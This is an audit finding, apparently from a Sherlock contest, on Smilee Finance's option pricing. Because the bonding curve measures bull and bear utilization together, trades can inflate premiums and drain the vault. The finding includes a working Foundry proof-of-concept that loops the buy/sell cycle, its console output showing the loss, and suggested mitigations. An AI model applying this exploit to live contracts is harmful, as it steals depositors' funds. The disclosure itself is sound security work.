Rural Blonde Cougar

high

# Utilization rate for bonding curve purposes is calculated for a total of bull and bear usage, which can be abused to steal all vault funds

## Summary

The bonding curve used in the Smilee volatility calculation has the following purpose (from the docs):
> to have volatility that responds to trades: specifically if a user buys volatility goes up, if they sell it goes down so as to ensure responsiveness to market actions

The problem is that this volatility used to price IG options is calculated from the utilization rate of both bull and bear together, however bull and bear premiums can be significantly different (when the current price is away from the strike), which makes changes to bull and bear pricing assymetrical in relation to utilization rate. This makes it possible to buy higher-priced option (bull or bear), then manipulate the volatility up by buying 100% of the lower-priced option (bear or bull), then sell higher-priced option at inflated volatility (== inflated price), and then sell lower-prices option at reduced volatility.

The price increase of the higher-priced option is larger in absolute value than the price decrease of lower-priced option, meaning these actions together are profitable for the trader (basically stealing from the vault).

Repeating such actions allows to steal all vault funds rather quickly (in about 1500 transactions)

## Vulnerability Detail

This is the scenario of stealing funds from the vault:
1. Example: strike = 1, price = 1.2, weekly expiration, Kb = 1.23, vault has total deposit of 2 (available liquidity bull = 1, bear = 1)
2. Buy 0.5 IG Bull, premium paid = 0.05058 [increases utilization to 25%]
3. Buy 1 IG Bear, premium paid = 0.0001 [increases utilization to 75% basically for free]
4. Sell 0.5 IG Bull, premium received = 0.05139 [decreases utilization to 50%]
5. Sell 1 IG Bear, premium received = 0.000003 [decreases utilization to 0%]

As can be seen from the example, total premium paid is 0.05059, total premium received is 0.05139, all in one transaction. That's about 0.07% of vault amount stolen per transaction. All vault can be stolen in about 1500 transactions.

The numbers can be different depending on current price, expiry, volatility and the other things, but can be optimized to select appropriate amounts and price difference from the strike to steal from the vault.

## Impact

All vault funds can be stolen by malicious user in about 1500 transactions.

## Proof Of Concept

Copy to `attack.t.sol`:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {UD60x18, ud, convert} from "@prb/math/UD60x18.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IPositionManager} from "@project/interfaces/IPositionManager.sol";
import {Epoch} from "@project/lib/EpochController.sol";
import {AmountsMath} from "@project/lib/AmountsMath.sol";
import {EpochFrequency} from "@project/lib/EpochFrequency.sol";
import {OptionStrategy} from "@project/lib/OptionStrategy.sol";
import {AddressProvider} from "@project/AddressProvider.sol";
import {MarketOracle} from "@project/MarketOracle.sol";
import {FeeManager} from "@project/FeeManager.sol";
import {Vault} from "@project/Vault.sol";
import {TestnetToken} from "@project/testnet/TestnetToken.sol";
import {TestnetPriceOracle} from "@project/testnet/TestnetPriceOracle.sol";
import {DVPUtils} from "./utils/DVPUtils.sol";
import {TokenUtils} from "./utils/TokenUtils.sol";
import {Utils} from "./utils/Utils.sol";
import {VaultUtils} from "./utils/VaultUtils.sol";
import {MockedIG} from "./mock/MockedIG.sol";
import {MockedRegistry} from "./mock/MockedRegistry.sol";
import {MockedVault} from "./mock/MockedVault.sol";
import {TestnetSwapAdapter} from "@project/testnet/TestnetSwapAdapter.sol";
import {PositionManager} from "@project/periphery/PositionManager.sol";


contract IGTradeTest is Test {
    using AmountsMath for uint256;

    address admin = address(0x1);

    // User of Vault
    address alice = address(0x2);
    address bob = address(0x3);

    //User of DVP
    address charlie = address(0x4);
    address david = address(0x5);

    AddressProvider ap;
    TestnetToken baseToken;
    TestnetToken sideToken;
    FeeManager feeManager;

    MockedRegistry registry;

    MockedVault vault;
    MockedIG ig;
    TestnetPriceOracle priceOracle;
    TestnetSwapAdapter exchange;
    uint _strike;

    function setUp() public {
        vm.warp(EpochFrequency.REF_TS);
        //ToDo: Replace with Factory
        vm.startPrank(admin);
        ap = new AddressProvider(0);
        registry = new MockedRegistry();
        ap.grantRole(ap.ROLE_ADMIN(), admin);
        registry.grantRole(registry.ROLE_ADMIN(), admin);
        ap.setRegistry(address(registry));

        vm.stopPrank();

        vault = MockedVault(VaultUtils.createVault(EpochFrequency.WEEKLY, ap, admin, vm));
        priceOracle = TestnetPriceOracle(ap.priceOracle());

        baseToken = TestnetToken(vault.baseToken());
        sideToken = TestnetToken(vault.sideToken());

        vm.startPrank(admin);
       
        ig = new MockedIG(address(vault), address(ap));
        ig.grantRole(ig.ROLE_ADMIN(), admin);
        ig.grantRole(ig.ROLE_EPOCH_ROLLER(), admin);
        vault.grantRole(vault.ROLE_ADMIN(), admin);
        vm.stopPrank();
        ig.setOptionPrice(1e3);
        ig.setPayoffPerc(0.1e18); // 10 % -> position paying 1.1
        ig.useRealDeltaHedge();
        ig.useRealPercentage();
        ig.useRealPremium();

        DVPUtils.disableOracleDelayForIG(ap, ig, admin, vm);

        vm.prank(admin);
        registry.registerDVP(address(ig));
        vm.prank(admin);
        MockedVault(vault).setAllowedDVP(address(ig));
        feeManager = FeeManager(ap.feeManager());

        exchange = TestnetSwapAdapter(ap.exchangeAdapter());
    }

    // try to buy/sell ig bull below strike for user's profit
    // this will not be hedged, and thus the vault should lose funds
    function test() public {
        _strike = 1e18;
        VaultUtils.addVaultDeposit(alice, 1e18, admin, address(vault), vm);
        VaultUtils.addVaultDeposit(bob, 1e18, admin, address(vault), vm);

        Utils.skipWeek(true, vm);

        vm.prank(admin);
        ig.rollEpoch();

        VaultUtils.logState(vault);
        DVPUtils.debugState(ig);

        // increasing internal volatility cheaply
        testBuyOption(1e18, 1e18, 0);
        testSellOption(1.2e18, 1e18, 0);
        for (uint i = 0; i < 100; i++) {
            testBuyOption(1.2e18, 0.5e18, 0);
            testBuyOption(1.2e18, 0, 1e18); // increase volatility to raise premium
            testSellOption(1.2e18, 0.5e18, 0); // sell at increased premium
            testSellOption(1.2e18, 0, 1e18); // sell at reduced premium, but the loss should be smaller in absolute value
        }
        testBuyOption(1.2e18, 1e18, 0);
        testSellOption(1e18, 1e18, 0);

        (uint256 btAmount, uint256 stAmount) = vault.balances();
        console.log("base token notional", btAmount);
        console.log("side token notional", stAmount);
    }

    function testBuyOption(uint price, uint128 optionAmountUp, uint128 optionAmountDown) internal {

        vm.prank(admin);
        priceOracle.setTokenPrice(address(sideToken), price);

        (uint256 premium, uint256 fee) = _assurePremium(charlie, _strike, optionAmountUp, optionAmountDown);

        vm.startPrank(charlie);
        premium = ig.mint(charlie, _strike, optionAmountUp, optionAmountDown, premium, 10e18, 0);
        vm.stopPrank();

        console.log("premium", premium);
    }

    function testSellOption(uint price, uint128 optionAmountUp, uint128 optionAmountDown) internal returns (uint) {
        vm.prank(admin);
        priceOracle.setTokenPrice(address(sideToken), price);

        uint256 charliePayoff;
        uint256 charliePayoffFee;
        {
            vm.startPrank(charlie);
            (charliePayoff, charliePayoffFee) = ig.payoff(
                ig.currentEpoch(),
                _strike,
                optionAmountUp,
                optionAmountDown
            );

            charliePayoff = ig.burn(
                ig.currentEpoch(),
                charlie,
                _strike,
                optionAmountUp,
                optionAmountDown,
                charliePayoff,
                0.1e18
            );
            vm.stopPrank();

            console.log("payoff received", charliePayoff);
        }
    }

    function _assurePremium(
        address user,
        uint256 strike,
        uint256 amountUp,
        uint256 amountDown
    ) private returns (uint256 premium_, uint256 fee) {
        (premium_, fee) = ig.premium(strike, amountUp, amountDown);
        TokenUtils.provideApprovedTokens(admin, address(baseToken), user, address(ig), premium_*5, vm);
    }
}
```

Execution console:
```solidity
  baseToken balance 1000000000000000000
  sideToken balance 1000000000000000000
...
  premium 50583133160718864
  premium 103825387572671
  payoff received 51392715330063004
  payoff received 2794032872479
  premium 50583133160718864
  premium 103825387572671
  payoff received 51392715330063004
  payoff received 2794032872479
...
  payoff received 51392715330063004
  payoff received 2794032872479
  premium 102785430660126009
  payoff received 4990524176759610
  base token notional 932297866651985054
  side token notional 999999999999999956
```

Notice:
1. Each 4 actions pay a total premium of 0.05059 and receive a total payoff of 0.05139 (0.0008 profit per 4 actions)
2. After 100 such sequences of 4 actions, the vault loses 0.068 (6.8%)

## Code Snippet

`Notional.utilizationRateFactors` returns total (bear+bull) used and initial liquidity:
https://github.com/sherlock-audit/2024-02-smilee-finance/blob/main/smilee-v2-contracts/src/lib/Notional.sol#L154-L160

`IG.getUtilizationRate` uses these to calculate utilization rate:
https://github.com/sherlock-audit/2024-02-smilee-finance/blob/main/smilee-v2-contracts/src/IG.sol#L116-L121

## Tool used

Manual Review

## Recommendation

Possible mitigations include:
1. Increase the spread between buying and selling premium
2. Calculate utilization rate separately for bull and bear. However, this is not the best solution, because it might open up statistical attack vectors due to difference in bull/bear volatilities (has to be investigated more deeply)
